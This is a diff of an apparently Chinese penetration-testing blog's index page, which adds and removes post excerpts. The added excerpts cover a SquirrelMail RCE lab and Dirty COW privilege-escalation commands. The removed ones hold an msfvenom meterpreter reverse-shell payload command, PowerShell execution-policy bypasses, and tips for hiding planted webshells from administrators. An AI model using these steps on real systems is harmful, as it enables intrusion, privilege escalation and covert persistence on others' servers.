@@ -139,6 +139,101 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/04/24/SquirrelMail-RCE/">
+                SquirrelMail < 1.4.23 RCE (CVE-2017-7692) 利用小记 [ 尼玛,多次尝试未果,待解决…… ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/SquirrelMail-Rce/">SquirrelMail Rce</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 环境简介<br>&nbsp;&nbsp;&nbsp;&nbsp;关于 SquirrelMail 就不用多说了吧[一套开源php 邮件程序][说实话,用这套程序的目标还是蛮多的,尼玛,不说了,都是泪……],在重现漏洞利用之前,我们需要先把邮件服务器简单搭起来,这里以centos 6.8 x86 为例 [为了避免安装过程出问题,iptables和selinux已事先全部关闭],大致的配置过程如下,下面是具体测试环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">kali</span> 2017: 执行<span class="selector-tag">SquirrelMail_RCE_exploit</span><span class="selector-class">.sh</span>  利用脚本</div><div class="line"><span class="selector-tag">centos</span> 6<span class="selector-class">.8</span> <span class="selector-tag">x86</span>:  完全模拟真实的生产环境,<span class="selector-tag">lamp</span>全程源码包编译配置<span class="selector-attr">[后期会把各种配置细节更新上来]</span></div><div class="line"><span class="selector-tag">SquirrelMail</span>版本 1<span class="selector-class">.4</span><span class="selector-class">.20</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/24/SquirrelMail-RCE/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/24/kali-config/">
+                kali 安装后的简要配置指南
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/kali-config/">kali config</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,最近刚好看到kali有更新,想想自己用的系统似乎也很久没更新过了,这里就顺手记录了下关于部署渗透系统的一些心得,留给有需要的朋友做些简单参考,首先,到kali的官网去下载最新版的kali镜像或者镜像虚拟机,这里我就直接用它已经配好的虚拟机来做演示说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-amd64.<span class="number">7</span>z</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-i686.<span class="number">7</span>z</div></pre></td></tr></table></figure></p>
+<p>2,镜像下载好以后,解压镜像文件,然后到VMware中选择并打开该虚拟机,进入系统,编辑source.list文件,修改为官方的apt源,强烈建议这里用官网的源,尽量不要用任何第三方源,务必谨记<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/apt/sources.list</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb <span class="symbol">http:</span>/<span class="regexp">/http.kali.org/kali</span> kali-rolling main non-free contrib</div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2017/04/24/kali-config/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/22/dirty/">
+                linux 溢出提权小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/exp/">exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透中,提的成功率相对来讲还是蛮高的,屡试不爽,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd	干完活,一定要记得把东西还原回来,exp已经有相应的msf模块可用,大家请自行尝试</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/22/dirty/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/04/22/win-0day-privilege/">
                 windows 溢出提权小记
             </a>
@@ -294,107 +389,6 @@
 
 </div>
             
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/10/06/powersploit/">
-                powershell 渗透框架 [ PowerSploit篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-10-06</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/powershell/">powershell</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;和nishang一样,PowerSploit也是一款非常实用的powershell渗透框架,下面就其用法做些简要说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted 还是一样,先放开脚本执行限制,实际渗透中自己bypass一下就好了</div></pre></td></tr></table></figure></p>
-<p><br></p>
-<p>1,命令执行类模块[CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/10/06/powersploit/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/10/05/nishang/">
-                powershell 渗透框架 [nishang篇]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-10-05</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/powershell/">powershell</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;注意,powershell只针对win7以后的系统,此之前的系统是没有引入powershell的,至于powershell是什么,这里就不废话了,大家自行谷歌,在使用各种powrshell脚本的过程中,系统权限自然也是越高越好,权限大一些效果可能会更佳,至于为什么会选择powershell,想必大家早已心知肚明,免杀,可直接跟系统api交互,方便定制……这里就不啰嗦了,说破天,我们最终的目的也是希望能在实际渗透中把它用起来,不然,价值何在呢<br><br></p>
-<p>1,今天先来聊聊第一款powershell工具[其实把它称为powershell渗透框架似乎更合适些],nishang[想必早已家喻户晓],关于nishang中的每个ps脚本的选项用法,在代码的最前面都已有详细说明,请务必仔细阅读,因为系统默认是禁止执行ps脚本的,所以后面都会带上bypass选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted  如果你得到的是一个交互式的ps的shell,你也可以用该命令来放开脚本执行限制</div><div class="line"><span class="comment"># powershell –exec bypass –Command "Get-Host | Select-Object Version"  查看当前powershell版本,有些脚本需要在脚本的powershell版本中执行</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/10/05/nishang/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/10/05/hidden-webshell/">
-                放心种下你的webshell 之 webshell隐藏小记
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-10-05</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/webshell-hidden/">webshell hidden</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<p>1,拿到webshell的第一件事儿,就是顺手把webshell时间属性改为和同目录其它文件相同的时间戳,一般在大马里和其它的一些webshell管理工具都提供了类似的功能</p>
-<p>2,尽量放在那些程序员和管理都不会经常光顾到的目录中,比如:各种第三方工具(phpmyadmin)的一些插件目录,主题目录以及一些临时目录……</p>
-<p>3,webshell所在目录的层级自然是越深越好,平时网站不出问题的话,一般四五级目录里面很少会被人注意到……<br>
-        </div>
-        <a href="/2016/10/05/hidden-webshell/" class="read-more">Read More</a>
-    
-
-</div>
-            
         </section>
     </div>
 </div>
@@ -424,7 +418,7 @@
 
 <footer class="footer-content">
 
-<center>如果有朋友需要优质vps,可以去<a href="http://www.laoxuehost.com/vps/" target="_blank">老薛</a>买,异常稳定,本人已自用多年,使用下面的优惠码,会有 <font color="red">25% </font>的折扣哦...</center><br>
+<center>如果有朋友需要优质vps,可以去<a href="http://www.laoxuehost.com/vps/" target="_blank">老薛</a>买,异常稳定,本人已自用多年,使用下面的优惠码, <font color="red">25% </font>的折扣哦...</center><br>
 至少,在同等质量的vps中,已经算是非常好的了,起码自己平时 youtube 1080 基本是没什么问题<br>
 <br>
 <a href="http://www.laoxuehost.com/vps/" target="_blank" > 购买老薛vps </a> &nbsp;&nbsp;&nbsp;&nbsp; 优惠码: <font color="red">nuddle123</font><br>
@@ -493,7 +487,7 @@ document.getElementById("showDays").innerHTML = " 其实博客已默默坚挺了
         </div>
     </div>
 		<audio autoplay="autoplay">
-		<source src="/img/Good Time.mp3" type="audio/mpeg" />
+		<source src="/img/call you tonight.mp3" type="audio/mpeg" />
 		</audio>
 </footer>
 
